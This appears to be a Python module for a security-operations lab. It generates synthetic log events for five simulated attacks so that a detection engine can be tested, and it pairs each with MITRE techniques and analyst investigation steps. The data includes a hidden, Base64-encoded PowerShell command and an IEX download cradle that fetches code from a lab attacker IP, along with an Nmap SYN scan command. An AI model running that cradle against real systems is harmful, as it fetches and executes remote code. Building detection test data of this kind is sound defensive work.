"""
Attack simulation scenarios.

Each scenario is a generator of *synthetic telemetry* — the log events an attack
would leave behind — so the blue-team detection engine has something to catch.
No real exploitation occurs and no malicious code is produced: the "malware"
scenario uses the EICAR industry test signature only.

Every scenario returns a dict with:
    name, objective, mitre, steps (analyst-facing narrative), events (telemetry),
    expected_rules (which detections should fire), investigation (analyst SOP).
"""

from __future__ import annotations

import random
import time
from datetime import datetime, timezone
from typing import Dict, List

from .log_generator import HOSTS, ATTACKER, DOMAIN, _host

# EICAR standard anti-malware test signature & its well-known SHA-256.
EICAR_SIG = "EICAR-Test-File"
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


def _ts(offset: float = 0.0) -> str:
    return datetime.fromtimestamp(time.time() + offset, tz=timezone.utc).isoformat()


# --------------------------------------------------------------------------- #
# Scenario 1 — Password Spraying
# --------------------------------------------------------------------------- #
def scenario_password_spray() -> Dict:
    target = "WIN-DC01"
    accounts = ["j.doe", "a.smith", "m.khan", "r.patel", "s.nguyen",
                "l.garcia", "t.brown", "administrator"]
    events: List[Dict] = []
    base = -8.0
    for i, acct in enumerate(accounts):
        events.append({
            "timestamp": _ts(base + i * 0.4), "source": "WinEventLog:Security",
            "event_id": 4625, "host": target, "host_ip": _host(target)["ip"],
            "user": acct, "src_ip": ATTACKER["ip"], "logon_type": 3,
            "auth_package": "NTLM", "status": "0xC000006A", "domain": DOMAIN,
            "message": f"An account failed to log on. Account: {acct}. "
                       f"Reason: bad password (single password sprayed).",
        })
    # second low-and-slow pass: re-target the privileged 'administrator'
    # account with two more guesses (classic spray tradecraft — privileged
    # accounts are worth extra attempts). This pushes 'administrator' to
    # 3 failures inside the window and trips the account-scoped rule (SOC-006).
    for j in range(2):
        events.append({
            "timestamp": _ts(base + len(accounts) * 0.4 + j * 0.4),
            "source": "WinEventLog:Security",
            "event_id": 4625, "host": target, "host_ip": _host(target)["ip"],
            "user": "administrator", "src_ip": ATTACKER["ip"], "logon_type": 3,
            "auth_package": "NTLM", "status": "0xC000006A", "domain": DOMAIN,
            "message": "An account failed to log on. Account: administrator. "
                       "Reason: bad password (second-pass targeted guess).",
        })
    # one success on a weak account (the breach)
    events.append({
        "timestamp": _ts(base + (len(accounts) + 2) * 0.4), "source": "WinEventLog:Security",
        "event_id": 4624, "host": target, "host_ip": _host(target)["ip"],
        "user": "t.brown", "src_ip": ATTACKER["ip"], "logon_type": 3,
        "auth_package": "NTLM", "domain": DOMAIN,
        "message": "An account was successfully logged on (t.brown) — spray hit.",
    })
    return {
        "name": "Password Spraying Attack",
        "objective": "Gain a foothold by trying one common password across many "
                     "domain accounts, staying under per-account lockout limits.",
        "mitre": ["T1110.003 Password Spraying", "TA0006 Credential Access"],
        "steps": [
            "Attacker enumerates valid usernames (OSINT / LDAP null session).",
            "Single password (e.g. 'Summer2025!') tried once per account.",
            "Privileged 'administrator' account is re-targeted on a second pass.",
            "Low-and-slow timing avoids account lockout thresholds.",
            "One weak account (t.brown) authenticates successfully.",
        ],
        "expected_rules": ["SOC-001", "SOC-006"],
        "investigation": [
            "Pivot on src_ip 10.10.20.66 — confirm it is the Kali host, not a user.",
            "Build a timeline of 4625 events; count distinct target accounts.",
            "Identify the 4624 success immediately after the failures (t.brown).",
            "Check what t.brown's session did next (process creation, logons).",
            "Force password reset for t.brown; block the source IP at the firewall.",
        ],
        "events": events,
    }


# --------------------------------------------------------------------------- #
# Scenario 2 — Nmap Reconnaissance
# --------------------------------------------------------------------------- #
def scenario_nmap_recon() -> Dict:
    target = "WIN-SRV02"
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 389, 443,
             445, 1433, 3306, 3389, 5985, 5986, 8080, 8443]
    events: List[Dict] = []
    base = -6.0
    for i, port in enumerate(ports):
        events.append({
            "timestamp": _ts(base + i * 0.15), "source": "Firewall:flow",
            "action": "connection_attempt", "src_ip": ATTACKER["ip"],
            "dst_ip": _host(target)["ip"], "dst_port": port, "proto": "tcp",
            "flags": "SYN",
            "message": f"SYN scan probe to {_host(target)['ip']}:{port}",
        })
    return {
        "name": "Nmap Reconnaissance",
        "objective": "Map the attack surface of a target host by scanning for open "
                     "TCP services prior to exploitation.",
        "mitre": ["T1046 Network Service Discovery", "T1595 Active Scanning",
                  "TA0007 Discovery"],
        "steps": [
            "Attacker runs an Nmap SYN scan: nmap -sS -p- 10.10.10.20.",
            "Half-open SYN probes are sent to a wide range of TCP ports.",
            "Open ports reply SYN/ACK; firewall logs every probe.",
            "Service/version detection follows on the open ports.",
        ],
        "expected_rules": ["SOC-002"],
        "investigation": [
            "Confirm a single source touched many ports in a short window.",
            "Determine which ports answered (true exposure) vs filtered.",
            "Correlate with any follow-on exploit attempts on open services.",
            "Tighten firewall ACLs; ensure the red-team segment is isolated.",
        ],
        "events": events,
    }


# --------------------------------------------------------------------------- #
# Scenario 3 — Suspicious PowerShell Execution
# --------------------------------------------------------------------------- #
def scenario_suspicious_powershell() -> Dict:
    host = "WIN-CLIENT01"
    user = "t.brown"
    # A realistic but inert encoded download-cradle command line (does nothing here)
    cmdline = ("powershell.exe -nop -w hidden - exec bypass -enc "
               "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA"
               "bABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA")
    events = [
        {
            "timestamp": _ts(-4.0), "source": "WinEventLog:Sysmon", "event_id": 1,
            "host": host, "host_ip": _host(host)["ip"], "user": user,
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": cmdline,
            "parent_image": "C:\\Windows\\System32\\cmd.exe",
            "hashes": "SHA256=908B64...,IMPHASH=...",
            "message": "Process create: powershell.exe (encoded, hidden window).",
        },
        {
            "timestamp": _ts(-3.6), "source": "WinEventLog:PowerShell", "event_id": 4104,
            "host": host, "host_ip": _host(host)["ip"], "user": user,
            "command_line": "IEX (New-Object Net.WebClient).DownloadString('http://10.10.20.66/a')",
            "message": "ScriptBlock logging: download cradle via Invoke-Expression.",
        },
    ]
    return {
        "name": "Suspicious PowerShell Execution",
        "objective": "Execute a fileless, in-memory payload using an encoded, "
                     "hidden PowerShell download cradle.",
        "mitre": ["T1059.001 PowerShell", "T1027 Obfuscated Files",
                  "T1105 Ingress Tool Transfer", "TA0002 Execution"],
        "steps": [
            "Initial access account (t.brown) opens a hidden PowerShell.",
            "Command line uses -enc (Base64) and -w hidden to evade casual review.",
            "A Net.WebClient download cradle pulls a stage from the attacker host.",
            "Payload runs in memory (fileless) to avoid disk-based AV.",
        ],
        "expected_rules": ["SOC-004"],
        "investigation": [
            "Decode the Base64 -enc blob to recover the real command.",
            "Pull Sysmon EventID 3 to see if the host beaconed to 10.10.20.66.",
            "Pull 4104 ScriptBlock logs for the full deobfuscated script.",
            "Isolate the host; hunt the same cradle pattern across the estate.",
        ],
        "events": events,
    }


# --------------------------------------------------------------------------- #
# Scenario 4 — Privilege Escalation
# --------------------------------------------------------------------------- #
def scenario_privilege_escalation() -> Dict:
    host = "WIN-CLIENT01"
    user = "svc_backup"
    events = [
        {
            "timestamp": _ts(-3.0), "source": "WinEventLog:Sysmon", "event_id": 1,
            "host": host, "host_ip": _host(host)["ip"], "user": "t.brown",
            "image": "C:\\Users\\t.brown\\AppData\\Local\\Temp\\winPEAS.exe",
            "command_line": "winPEAS.exe quiet",
            "parent_image": "C:\\Windows\\System32\\cmd.exe",
            "message": "Process create: local privilege-escalation enumeration tool.",
        },
        {
            "timestamp": _ts(-2.4), "source": "WinEventLog:Security", "event_id": 4672,
            "host": host, "host_ip": _host(host)["ip"], "user": user,
            "src_ip": _host(host)["ip"],
            "privileges": "SeDebugPrivilege, SeTcbPrivilege, SeImpersonatePrivilege",
            "message": "Special privileges assigned to new logon (svc_backup).",
        },
    ]
    return {
        "name": "Privilege Escalation",
        "objective": "Elevate from a standard user to SYSTEM/admin by abusing a "
                     "mis-scoped service account and token privileges.",
        "mitre": ["T1078 Valid Accounts", "T1548 Abuse Elevation Control",
                  "T1134 Access Token Manipulation", "TA0004 Privilege Escalation"],
        "steps": [
            "Attacker runs a local enumeration tool from a Temp directory.",
            "Discovers svc_backup holds SeImpersonate/SeDebug privileges.",
            "Abuses the token to obtain elevated context (potato-style).",
            "EventID 4672 records the sensitive privileges being granted.",
        ],
        "expected_rules": ["SOC-003"],
        "investigation": [
            "Identify the non-admin account receiving SeDebug/SeImpersonate.",
            "Trace the parent process tree back to initial access.",
            "Review why svc_backup holds those privileges (mis-config).",
            "Remove excess privileges; rotate the service credential.",
        ],
        "events": events,
    }


# --------------------------------------------------------------------------- #
# Scenario 5 — Malware Simulation (EICAR — harmless industry test artefact)
# --------------------------------------------------------------------------- #
def scenario_malware_eicar() -> Dict:
    host = "WIN-CLIENT01"
    user = "t.brown"
    path = "C:\\Users\\t.brown\\AppData\\Local\\Temp\\invoice_2025.exe"
    events = [
        {
            "timestamp": _ts(-2.0), "source": "WinEventLog:Sysmon", "event_id": 11,
            "host": host, "host_ip": _host(host)["ip"], "user": user,
            "file": path, "signature": EICAR_SIG, "sha256": EICAR_SHA256,
            "message": f"File create: {path} (matches EICAR test signature).",
        },
        {
            "timestamp": _ts(-1.6), "source": "EDR:alert", "action": "malware_detected",
            "host": host, "host_ip": _host(host)["ip"], "user": user,
            "file": path, "signature": EICAR_SIG, "sha256": EICAR_SHA256,
            "verdict": "quarantined",
            "message": f"Malware signature {EICAR_SIG} detected and quarantined.",
        },
    ]
    return {
        "name": "Malware Simulation (EICAR)",
        "objective": "Validate end-to-end malware detection & response using the "
                     "harmless EICAR industry test file (no real malware involved).",
        "mitre": ["T1204 User Execution", "T1105 Ingress Tool Transfer",
                  "TA0002 Execution"],
        "steps": [
            "A lure (invoice_2025.exe) is written to the user's Temp directory.",
            "The file contains the EICAR test string — recognised by all AV/EDR.",
            "Sysmon EventID 11 records the file create; EDR raises a detection.",
            "The artefact is quarantined; the SOC validates the response chain.",
        ],
        "expected_rules": ["SOC-005"],
        "investigation": [
            "Confirm the EDR verdict and that the file was quarantined.",
            "Hash the artefact and check against threat intel / VirusTotal.",
            "Determine delivery vector (download, email, lateral copy).",
            "Sweep the estate for the same hash; confirm no execution occurred.",
        ],
        "events": events,
    }


SCENARIOS = {
    "spray":       scenario_password_spray,
    "nmap":        scenario_nmap_recon,
    "powershell":  scenario_suspicious_powershell,
    "privesc":     scenario_privilege_escalation,
    "malware":     scenario_malware_eicar,
}

SCENARIO_ORDER = ["spray", "nmap", "powershell", "privesc", "malware"]


def get_scenario(key: str) -> Dict:
    return SCENARIOS[key]()


def all_scenarios() -> List[Dict]:
    return [SCENARIOS[k]() for k in SCENARIO_ORDER]
